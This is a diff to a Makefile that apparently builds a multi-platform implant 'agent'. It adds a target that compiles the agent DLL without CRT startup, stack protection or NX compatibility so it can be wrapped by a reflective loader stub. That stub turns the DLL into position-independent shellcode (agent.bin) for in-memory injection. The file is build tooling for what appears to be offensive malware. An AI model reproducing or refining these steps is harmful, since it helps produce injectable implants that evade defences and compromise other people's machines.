@@ -90,13 +90,21 @@ exe:
 dll:
 	$(WIN_CC) $(WIN_CFLAGS) -shared -DBUILD_DLL -o agent.dll main.c $(WIN_LDFLAGS)
 
+# DLL for shellcode: skip CRT startup (avoids TLS init + security cookie crash
+# in reflective context). Entry is DllMain directly, not _DllMainCRTStartup.
+# CRT functions (malloc, snprintf, etc.) still work — they're msvcrt.dll imports.
+dll-pic:
+	$(WIN_CC) $(WIN_CFLAGS) -shared -DBUILD_DLL -fno-stack-protector \
+		-Wl,--entry,DllMain,--disable-nxcompat \
+		-o agent_pic.dll main.c $(WIN_LDFLAGS)
+
 # True PIC shellcode: reflective loader stub + DLL
-shellcode: gen_shellcode dll
+shellcode: gen_shellcode dll-pic
 	$(WIN_CC) -Os -nostdlib -nostartfiles -fno-stack-protector \
 		-fno-exceptions -fno-asynchronous-unwind-tables -fno-ident \
 		-Wl,--no-seh,--entry,_start -o pic_stub.exe pic_loader.c
-	x86_64-w64-mingw32-objcopy -O binary -j .text pic_stub.exe pic_stub.bin
-	./gen_shellcode pic_stub.bin agent.dll agent.bin
+	x86_64-w64-mingw32-objcopy -O binary pic_stub.exe pic_stub.bin
+	./gen_shellcode pic_stub.bin agent_pic.dll agent.bin
 	@echo "[+] PIC shellcode generated: agent.bin"
 
 service_exe: exe
@@ -112,5 +120,5 @@ macos-macho:
 all: exe linux-elf
 
 clean:
-	rm -f agent.exe agent.dll agent.bin agent_linux agent_macos agent_shellcode.o \
+	rm -f agent.exe agent.dll agent_pic.dll agent.bin agent_linux agent_macos agent_shellcode.o \
 	      gen_shellcode pic_stub.exe pic_stub.bin
